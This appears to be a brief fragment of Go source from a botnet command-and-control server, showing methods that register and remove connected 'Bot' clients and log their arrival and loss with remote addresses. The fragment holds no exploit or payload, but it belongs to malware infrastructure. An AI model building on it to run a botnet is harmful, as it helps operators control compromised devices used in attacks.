...
func (this *ClientList) AddClient(c *Bot) {
    this.addQueue <- c
	fmt.Printf("\033[90m[\033[92mBot Joined\033[90m] \033[90m[\033[92m%s\033[90m]\t \033[90m[\033[92m%s\033[90m]\n", c.source, c.conn.RemoteAddr())
}

func (this *ClientList) DelClient(c *Bot) {
    this.delQueue <- c
    fmt.Printf("\033[90m[\033[31mBot Died\033[90m]   \033[90m[\033[31m%s\033[90m]\t \033[90m[\033[31m%s\033[90m]\n", c.source, c.conn.RemoteAddr())
}
